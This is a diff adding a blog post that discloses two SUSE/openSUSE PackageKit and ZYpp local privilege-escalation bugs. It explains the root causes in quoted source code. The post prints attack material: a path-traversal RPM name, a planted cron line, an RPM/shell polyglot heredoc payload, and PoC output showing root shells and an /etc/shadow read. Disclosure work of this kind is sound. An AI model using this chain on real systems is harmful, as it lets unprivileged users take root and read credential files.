@@ -1,0 +1,342 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="robots" content="index, follow">
+  
+  <meta name="description" content="CVE-2026-104619 and CVE-2026-104620: signed PackageKit rollback and a simulated-install root write leading to root shells on SUSE/openSUSE.">
+  <title>When PackageKit and ZYpp disagree: CVE-2026-104619 and CVE-2026-104620</title>
+  <link rel="canonical" href="https://asimuntis.github.io/posts/suse-packagekit-zypp/">
+  
+  <link rel="stylesheet" href="/css/site.min.028cb553f218d83781ce241420465f78b42a828a8bdea0859501b6ea774c11cb.css" integrity="sha256-Aoy1U/IY2DeBziQUIEZfeLQqgoqL3qCFlQG26ndMEcs=">
+</head>
+<body>
+  
+  <header class="site-head">
+    <nav aria-label="Primary">[ <a href="/">home</a> ]</nav>
+  </header>
+  
+
+  <main>
+    
+  <article class="post">
+    <header>
+      <h1>When PackageKit and ZYpp disagree: CVE-2026-104619 and CVE-2026-104620</h1>
+      <p class="meta"><time datetime="2026-11-10">2026-11-10</time></p>
+      
+      <p class="tags"><a href="/tags/linux/">linux</a> / <a href="/tags/packagekit/">packagekit</a> / <a href="/tags/libzypp/">libzypp</a> / <a href="/tags/polkit/">polkit</a> / <a href="/tags/suse/">suse</a> / <a href="/tags/opensuse/">opensuse</a> / <a href="/tags/lpe/">lpe</a> / <a href="/tags/cve-2026-104619/">cve-2026-104619</a> / <a href="/tags/cve-2026-104620/">cve-2026-104620</a></p>
+      
+    </header>
+    <div class="content">
+      
+      <div class="series-note">I&rsquo;ve been looking at Linux LPEs in my spare time, partly to see how good LLMs
+are at it now. They helped me dig through big codebases, compare how different
+distros did things, try ideas and chase more leads than I&rsquo;d normally have time
+for. Figuring out what was actually exploitable and getting it working
+reliably still came down to knowing the targets and testing things for real.</div>
+      
+      
+      <img class="distro-lead" src="/img/distros/opensuse.svg" alt="openSUSE logo" width="56" height="56">
+      
+      <p>PackageKit is a root-owned service on the system D-Bus. Local clients send it
+package-management requests. Depending on the request, PackageKit either asks
+polkit or decides that no check is required, then hands the work to a distro
+backend. On SUSE, that&rsquo;s ZYpp. I wanted to see whether ZYpp stayed within the
+operation PackageKit had allowed. It didn&rsquo;t: I found two ways to make them
+disagree.</p>
+<p>The first bug was a signed-package rollback. An active desktop user could
+submit the exact ID of an older signed package as a normal update. PackageKit
+authorized <code>system-update</code>; ZYpp installed the older edition as root. SUSE
+PSIRT assigned
+<a href="https://www.suse.com/security/cve/CVE-2026-104619.html">CVE-2026-104619</a>.
+The rollback alone was useful, but I still needed a vulnerable package to get
+a root shell. A kernel would have added a reboot; PackageKit itself was a
+much nicer target. An older signed build was affected by public
+<a href="https://github.com/PackageKit/PackageKit/security/advisories/GHSA-f55j-vvr9-69xv">CVE-2026-41651</a>,
+so the whole chain stayed rebootless. The older daemon
+installed a small RPM whose <code>%post</code> ran as root, giving me a root shell on
+fully updated openSUSE Leap 16.0 and SLED 15 SP7 VMs in October 2026.</p>
+<p>The second bug let a regular user choose where PackageKit copied an RPM as
+root, even though the transaction was only a simulation. PackageKit skips
+authorization for the simulation, but ZYpp still copies the RPM. Its destination
+contains the untrusted RPM <code>Name</code>, so
+<code>..</code> components escape the staging directory. This one got
+<a href="https://www.suse.com/security/cve/CVE-2026-104620.html">CVE-2026-104620</a> from
+SUSE PSIRT.
+libzypp supplied the last hop for free: after <code>GetUpdates</code> successfully
+refreshes an enabled repository, its appdata loader scans a root-owned plugin
+directory and runs executable files as root.</p>
+<p>For the second chain, all I needed was a regular SSH account. It went straight
+to root without a desktop session, sudo, a reboot or installing a package. This
+is what I reproduced on the builds I tested in October 2026:</p>
+<table>
+	<thead>
+			<tr>
+					<th>Product</th>
+					<th>CVE-2026-104619: rollback to LPE</th>
+					<th>CVE-2026-104620: direct LPE</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>openSUSE Leap 16.0</td>
+					<td>Root shell from active GNOME session</td>
+					<td>Root from a regular SSH account</td>
+			</tr>
+			<tr>
+					<td>SLED 15 SP7</td>
+					<td>Root shell from active GNOME session</td>
+					<td>Root from a regular SSH account</td>
+			</tr>
+			<tr>
+					<td>SLES 15 SP7</td>
+					<td>Blocked by stricter policy</td>
+					<td>Root from a regular SSH account</td>
+			</tr>
+			<tr>
+					<td>SLES 16.0</td>
+					<td>Not tested</td>
+					<td>Root from a regular SSH account</td>
+			</tr>
+			<tr>
+					<td>openSUSE Tumbleweed</td>
+					<td>Exact older ID ignored; no rollback</td>
+					<td>Root from a regular SSH account</td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="cve-2026-104619-downgrading-through-updatepackages">CVE-2026-104619: downgrading through <code>UpdatePackages</code></h2>
+<p>The D-Bus interface accepts exact package IDs and transaction flags. One flag
+decides which polkit action is used:</p>
+<table>
+	<thead>
+			<tr>
+					<th>Request</th>
+					<th style="text-align: right">Flags</th>
+					<th>Polkit action on Leap/SLED</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>UpdatePackages(ONLY_TRUSTED, [old_id])</code></td>
+					<td style="text-align: right"><code>2</code></td>
+					<td><code>org.freedesktop.packagekit.system-update</code></td>
+			</tr>
+			<tr>
+					<td><code>UpdatePackages(ONLY_TRUSTED|ALLOW_DOWNGRADE, [old_id])</code></td>
+					<td style="text-align: right"><code>66</code></td>
+					<td><code>org.freedesktop.packagekit.package-downgrade</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>The Leap/SLED policy allows <code>system-update</code> for an active user, while
+<code>package-downgrade</code> requires administrator authentication. PackageKit selects
+the action from the caller-supplied <code>ALLOW_DOWNGRADE</code> bit
+(<a href="https://github.com/PackageKit/PackageKit/blob/09ef076e065ede945a3f827d6ba2b2b5889c9982/src/pk-transaction.c#L2829-L2841">PackageKit v1.2.8, <code>src/pk-transaction.c:2829-2841</code></a>).</p>
+<p>On the Leap/SLED path, ZYpp then <a href="https://github.com/PackageKit/PackageKit/blob/209aa62950e503494716fd046f8f5cb546bf57d4/backends/zypp/pk-backend-zypp.cpp#L920-L981">resolves the complete caller-supplied package
+ID</a>
+and <a href="https://github.com/PackageKit/PackageKit/blob/209aa62950e503494716fd046f8f5cb546bf57d4/backends/zypp/pk-backend-zypp.cpp#L3507-L3538">marks that exact solvable for installation</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>ui<span style="color:#ff7b72;font-weight:bold">::</span>Selectable<span style="color:#ff7b72;font-weight:bold">::</span>Ptr sel( ui<span style="color:#ff7b72;font-weight:bold">::</span>Selectable<span style="color:#ff7b72;font-weight:bold">::</span>get( solvable ));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PoolItem <span style="color:#d2a8ff;font-weight:bold">item</span>(solvable);
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// patches are special - they are not installed and can&#39;t have update candidates
+</span></span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> (sel<span style="color:#ff7b72;font-weight:bold">-&gt;</span>kind() <span style="color:#ff7b72;font-weight:bold">!=</span> ResKind<span style="color:#ff7b72;font-weight:bold">::</span>patch) {
+</span></span><span style="display:flex;"><span>    MIL <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">&#34;sel &#34;</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> sel<span style="color:#ff7b72;font-weight:bold">-&gt;</span>kind() <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">&#34; &#34;</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> sel<span style="color:#ff7b72;font-weight:bold">-&gt;</span>ident() <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (sel<span style="color:#ff7b72;font-weight:bold">-&gt;</span>installedEmpty()) {
+</span></span><span style="display:flex;"><span>        zypp_backend_finished_error (job, PK_ERROR_ENUM_DEP_RESOLUTION_FAILED, <span style="color:#a5d6ff">&#34;Package %s is not installed&#34;</span>, package_ids[i]);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>item.status ().setToBeInstalled (ResStatus<span style="color:#ff7b72;font-weight:bold">::</span>USER);
+</span></span></code></pre></div><p>It never checks whether the requested package is ZYpp&rsquo;s current update
+candidate (<code>sel-&gt;updateCandidateObj()</code>), and it does not reject an older edition
+when <code>ALLOW_DOWNGRADE</code> is absent. ZYpp still resolves
+dependencies, so matching older packages can be installed without forcing the
+RPM database.</p>
+<p>PackageKit used to stop this. The 2013 fix for
+<a href="https://www.suse.com/security/cve/CVE-2013-1764.html">CVE-2013-1764</a>
+<a href="https://github.com/PackageKit/PackageKit/commit/d3d14631042237bcfe6fb30a60e59bb6d94af425">replaced the requested package</a>
+with ZYpp&rsquo;s update candidate and failed if no candidate existed.
+<a href="https://github.com/PackageKit/PackageKit/commit/209aa62950e503494716fd046f8f5cb546bf57d4">Commit <code>209aa62950e5</code></a>,
+committed on 2024-09-12, removed both steps because it assumed the incoming list
+already contained the packages to install. On the system bus, however, those
+package IDs come from an untrusted client and reach the root ZYpp backend.</p>
+<p>On a fresh Leap 16 GNOME VM, a normal update request moved PackageKit
+backwards:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>before=PackageKit-1.2.8-160000.5.1.x86_64
+</span></span><span style="display:flex;"><span>target=PackageKit;1.2.8-160000.3.1;x86_64;openSUSE:repo-oss
+</span></span><span style="display:flex;"><span>flags=2
+</span></span><span style="display:flex;"><span>Finished exit=1
+</span></span><span style="display:flex;"><span>after=PackageKit-1.2.8-160000.3.1.x86_64
+</span></span></code></pre></div><p><code>Finished exit=1</code> is PackageKit&rsquo;s numeric success status. With flags <code>66</code>,
+PackageKit selected <code>package-downgrade</code>, failed with <code>Failed to obtain authentication</code>, and left <code>.5.1</code> installed.</p>
+<p>For the actual exploit, I rolled PackageKit itself back to <code>.3.1</code>, a build
+predating the fix for public CVE-2026-41651. The older daemon&rsquo;s
+transaction re-invocation flaw let the PoC make PackageKit trust a loopback RPM
+repository and install a small package whose <code>%post</code> ran as root.
+CVE-2026-41651 is the second stage, not the cause of the rollback.</p>
+<p>On Leap, that got me root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span><span style="color:#8b949e">poc@localhost:~&gt; python3 poc.py --root-shell
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[*] uid=1001, mode=root shell
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[*] 1/4 rolling back PackageKit
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[+] PackageKit-1.2.8-160000.3.1.x86_64
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[*] 2/4 preparing signed local repository
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[*] 3/4 installing proof package
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[*] 4/4 restoring official repository
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[+] root shell ready (euid 0)
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[+] opening bash
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">bash-5.2# whoami
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">root
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">bash-5.2# id
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">uid=1001(poc) gid=1001(poc) euid=0(root) groups=1001(poc) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">bash-5.2# head -n2 /etc/shadow
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">root:!:20730::::::
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">ftp:!:20730::::::
+</span></span></span></code></pre></div><p>I reproduced the same rollback on a registered SLED 15 SP7 GNOME VM, from
+<code>.4.17.1</code> to signed <code>.4.8.2</code>. SLES 15 SP7 GNOME behaved differently: its
+polkit profile required administrator authentication for <code>system-update</code>, so
+the request stopped before ZYpp ran.</p>
+<p>Tumbleweed was not affected by this rollback bug. PackageKit returned
+success, but nothing was downgraded. Its backend checks <code>is_tumbleweed()</code> and
+calls <code>upgrade_system()</code> before reaching the package-ID loop
+(<a href="https://github.com/PackageKit/PackageKit/blob/16c3c84ab4c498cefe1668314c9efc04e0c172ab/backends/zypp/pk-backend-zypp.cpp#L3579-L3585">PackageKit v1.4.0, <code>pk-backend-zypp.cpp:3579-3585</code></a>).
+To make sure the old package was not the reason, I installed it with Zypper.
+That worked. PackageKit never reached the requested ID; the Tumbleweed branch
+sent the request through a full distribution upgrade instead.</p>
+<h2 id="cve-2026-104620-simulate-still-copies-the-rpm">CVE-2026-104620: <code>SIMULATE</code> still copies the RPM</h2>
+<p>The second bug starts elsewhere and needs none of that rollback chain. A real
+installation of an unsigned local RPM maps to
+<code>org.freedesktop.packagekit.package-install-untrusted</code>. With the <code>SIMULATE</code>
+flag, PackageKit does not ask polkit at all
+(<a href="https://github.com/PackageKit/PackageKit/blob/09ef076e065ede945a3f827d6ba2b2b5889c9982/src/pk-transaction.c#L2890-L2927">PackageKit v1.2.8, <code>src/pk-transaction.c:2890-2927</code></a>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff;font-weight:bold">pk_bitfield_contain</span> (transaction<span style="color:#ff7b72;font-weight:bold">-&gt;</span>priv<span style="color:#ff7b72;font-weight:bold">-&gt;</span>cached_transaction_flags,
+</span></span><span style="display:flex;"><span>                         PK_TRANSACTION_FLAG_ENUM_ONLY_DOWNLOAD) <span style="color:#ff7b72;font-weight:bold">||</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">pk_bitfield_contain</span> (transaction<span style="color:#ff7b72;font-weight:bold">-&gt;</span>priv<span style="color:#ff7b72;font-weight:bold">-&gt;</span>cached_transaction_flags,
+</span></span><span style="display:flex;"><span>                         PK_TRANSACTION_FLAG_ENUM_SIMULATE) <span style="color:#ff7b72;font-weight:bold">||</span>
+</span></span><span style="display:flex;"><span>    priv<span style="color:#ff7b72;font-weight:bold">-&gt;</span>skip_auth_check <span style="color:#ff7b72;font-weight:bold">==</span> TRUE) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">g_debug</span> (<span style="color:#a5d6ff">&#34;No authentication required&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">pk_transaction_set_state</span> (transaction, PK_TRANSACTION_STATE_READY);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>SIMULATE</code> does not stop ZYpp from copying the RPM first
+(<a href="https://github.com/PackageKit/PackageKit/blob/09ef076e065ede945a3f827d6ba2b2b5889c9982/backends/zypp/pk-backend-zypp.cpp#L2562-L2569">PackageKit v1.2.8, <code>pk-backend-zypp.cpp:2562-2569</code></a>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// copy the rpm into tmpdir
+</span></span></span><span style="display:flex;"><span>string tempDest <span style="color:#ff7b72;font-weight:bold">=</span> tmpDir.path ().asString () <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;/&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> rpmHeader<span style="color:#ff7b72;font-weight:bold">-&gt;</span>tag_name () <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;.rpm&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> (zypp<span style="color:#ff7b72;font-weight:bold">::</span>filesystem<span style="color:#ff7b72;font-weight:bold">::</span>copy (full_paths[i], tempDest) <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>    zypp_backend_finished_error (
+</span></span><span style="display:flex;"><span>        job, PK_ERROR_ENUM_LOCAL_INSTALL_FAILED,
+</span></span><span style="display:flex;"><span>        <span style="color:#a5d6ff">&#34;Could not copy the rpm-file into the temp-dir&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>tag_name()</code> comes from the unsigned, attacker-controlled <code>RPMTAG_NAME</code>. The
+backend never checks that the normalized destination remains beneath <code>tmpDir</code>.
+<a href="https://github.com/openSUSE/libzypp/blob/fa8c09cdb80116e4e786e6ed4de6542dbd0648e5/zypp-logic/zypp-core/fs/PathInfo.cc#L839-L866">libzypp&rsquo;s copy helper</a>
+eventually starts:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/bin/cp --remove-destination -- attacker.rpm destination
+</span></span></code></pre></div><p>The write has three constraints: <a href="https://github.com/PackageKit/PackageKit/blob/09ef076e065ede945a3f827d6ba2b2b5889c9982/backends/zypp/pk-backend-zypp.cpp#L2551-L2560">the source has to parse as an
+RPM</a>,
+the backend always adds <code>.rpm</code> to the target path, and the file written is the
+RPM itself.</p>
+<h2 id="gadgets">Gadgets</h2>
+<h3 id="cronie-first-try">Cronie: first try</h3>
+<p>Cronie was the obvious first target. It does not reject the <code>.rpm</code> suffix. It
+logged the binary package data as malformed lines, then
+reached a valid entry stored in an RPM header field:</p>
+<pre tabindex="0"><code class="language-cron" data-lang="cron">* * * * * root /usr/bin/id &gt;/tmp/proof; rm -f /etc/cron.d/a.rpm
+</code></pre><p>That got UID 0 :-) It was still a poor final gadget: it added Cronie to the
+chain, the trigger could take a minute, and the parser errors were noisy.</p>
+<h3 id="libzypp-appdata-the-cleaner-chain">libzypp appdata: the cleaner chain</h3>
+<p>The better gadget was already sitting in libzypp:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/usr/lib/zypp/plugins/appdata
+</span></span></code></pre></div><p>The directory is root-owned, so I cannot write there directly. PackageKit can.
+The PoC uses this RPM name:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>../../../../usr/lib/zypp/plugins/appdata////////a
+</span></span></code></pre></div><p>which resolves to <code>/usr/lib/zypp/plugins/appdata/a.rpm</code>.</p>
+<p>A successful repository refresh
+<a href="https://github.com/openSUSE/libzypp/blob/fa8c09cdb80116e4e786e6ed4de6542dbd0648e5/zypp/zypp/ng/repomanager.cc#L842-L883">marks the <code>RepoManager</code> dirty</a>.
+When that root <code>RepoManager</code> is destroyed, its destructor scans the directory
+(<a href="https://github.com/openSUSE/libzypp/blob/fa8c09cdb80116e4e786e6ed4de6542dbd0648e5/zypp/zypp/ng/repomanager.cc#L274-L284">libzypp 17.38.15, <code>repomanager.cc:274-284</code></a>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>for_( it, entries.begin(), entries.end() )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  zypp<span style="color:#ff7b72;font-weight:bold">::</span>PathInfo pi( <span style="color:#ff7b72;font-weight:bold">*</span>it );
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">//DBG &lt;&lt; &#34;/tmp/xx -&gt;&#34; &lt;&lt; pi &lt;&lt; endl;
+</span></span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> ( pi.isFile() <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> pi.userMayRX() )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic">// trigger plugin
+</span></span></span><span style="display:flex;"><span>    cmd[<span style="color:#a5d6ff">2</span>] <span style="color:#ff7b72;font-weight:bold">=</span> pi.asString();		<span style="color:#8b949e;font-style:italic">// [2] - PROGRAM
+</span></span></span><span style="display:flex;"><span>    zypp<span style="color:#ff7b72;font-weight:bold">::</span>ExternalProgram prog( cmd, zypp<span style="color:#ff7b72;font-weight:bold">::</span>ExternalProgram<span style="color:#ff7b72;font-weight:bold">::</span>Stderr_To_Stdout );
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>.rpm</code> suffix means nothing to this loader. PackageKit copied the file as
+an RPM; libzypp now sees an executable regular file in its appdata plugin
+directory and launches it as a plugin.</p>
+<p>Firing it is simple: the PoC calls PackageKit&rsquo;s unauthenticated <code>GetUpdates</code>
+query. The ZYpp backend <a href="https://github.com/PackageKit/PackageKit/blob/09ef076e065ede945a3f827d6ba2b2b5889c9982/backends/zypp/pk-backend-zypp.cpp#L2448-L2470">refreshes repositories before returning updates</a>.
+Once that refresh succeeds, the dirty <code>RepoManager</code> runs the appdata scan as it
+is destroyed.
+<code>RefreshCache</code> requires polkit authorization. <code>GetUpdates</code> does not, and it
+reaches the same loader.</p>
+<p>The appdata path avoids Cronie and the one-minute delay. It also needs an
+enabled repository that refreshes successfully. Without that refresh, the RPM
+still lands as root, but libzypp does not run it.</p>
+<h3 id="the-rpmshell-polyglot">The RPM/shell polyglot</h3>
+<p>The planted file must be both a valid RPM and something the execution path can
+hand to a shell. The PoC uses the legacy 96-byte RPM lead for a newline and
+heredoc opener. <code>RPMTAG_DESCRIPTION</code> holds the terminator and command.
+Changing the Description invalidates the RPM&rsquo;s stored checksums. The builder
+recalculates them, leaving a package that RPM tools still accept.</p>
+<p>To <code>/bin/sh</code>, the useful part looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>: <span style="color:#a5d6ff">&lt;&lt;&#39;RPMEND&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">... RPM bytes before RPMTAG_DESCRIPTION ...
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">RPMEND</span>
+</span></span><span style="display:flex;"><span>/bin/sh /tmp/pkz/h;rm -f <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$0</span><span style="color:#a5d6ff">&#34;</span>;exit
+</span></span><span style="display:flex;"><span>... remaining RPM bytes ...
+</span></span></code></pre></div><p>When libzypp launches the file, its spawn engine calls
+<a href="https://github.com/openSUSE/libzypp/blob/fa8c09cdb80116e4e786e6ed4de6542dbd0648e5/zypp-logic/zypp-core/ng/io/forkspawnengine.cc#L404-L408"><code>execvp()</code></a>.
+The underlying <code>execve()</code> fails with <code>ENOEXEC</code>, so glibc retries the file
+through <code>/bin/sh</code>. The heredoc skips forward to its terminator in
+<code>RPMTAG_DESCRIPTION</code>; the next line starts <code>/tmp/pkz/h</code>, removes the planted
+file and exits before the shell reaches the remaining RPM bytes. The RPM has
+no scriptlets and is never installed.</p>
+<p>libzypp only runs files that root can execute.
+<code>/bin/cp --remove-destination</code> kept the RPM&rsquo;s mode, so a <code>0644</code> payload landed
+as root but stopped at <code>userMayRX()</code>. Since the attacker owns the source RPM,
+making it executable is one command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>chmod <span style="color:#a5d6ff">0755</span> payload.rpm
+</span></span></code></pre></div><p>My first pass dropped a setuid shell in <code>/tmp</code>. On my Tumbleweed VM, <code>/tmp</code> was
+mounted <code>nosuid</code>, so the file landed but the setuid bit bought me nothing. I
+could write it elsewhere, but that made the PoC needlessly dependent on the
+target&rsquo;s mount layout.</p>
+<p>With the payload ready, I can pop a root shell like this:</p>
+<ul>
+<li>I send <code>InstallFiles(SIMULATE)</code> with the crafted RPM; PackageKit hands it to
+the root ZYpp backend.</li>
+<li>The malicious RPM <code>Name</code> makes the backend copy it into
+<code>/usr/lib/zypp/plugins/appdata/</code>.</li>
+<li><code>GetUpdates</code> needs no authentication; its refresh leaves <code>RepoManager</code> dirty.</li>
+<li>Its destructor scans the appdata directory and starts the executable RPM as
+a plugin.</li>
+<li>The command in <code>RPMTAG_DESCRIPTION</code> starts a PTY helper that the PoC staged
+in <code>/tmp</code>.</li>
+<li>I connect to its Unix socket and get an interactive root shell.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span><span style="color:#8b949e">$</span> chmod <span style="color:#a5d6ff">0755</span> payload.rpm
+</span></span><span style="display:flex;"><span><span style="color:#8b949e">$</span> python3 pwn.py
+</span></span><span style="display:flex;"><span><span style="color:#8b949e">[*] sending simulated install
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[*] triggering appdata refresh
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[+] opening root bash
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">bash-5.3# id
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">uid=0(root) gid=0(root) groups=0(root)
+</span></span></span></code></pre></div><p>Nothing else to see here. More when the next distro ships its fixes. :)</p>
+
+    </div>
+  </article>
+
+  </main>
+
+  <footer><a href="https://x.com/adamsimuntis">adamm</a> · <span title="OpenPGP fingerprint: 1A0B 81CA 0A51 943E 2188 8D4D AD12 9DEF 055A E3F6" aria-label="OpenPGP key AD129DEF055AE3F6">AD129DEF055AE3F6</span></footer>
+</body>
+</html>
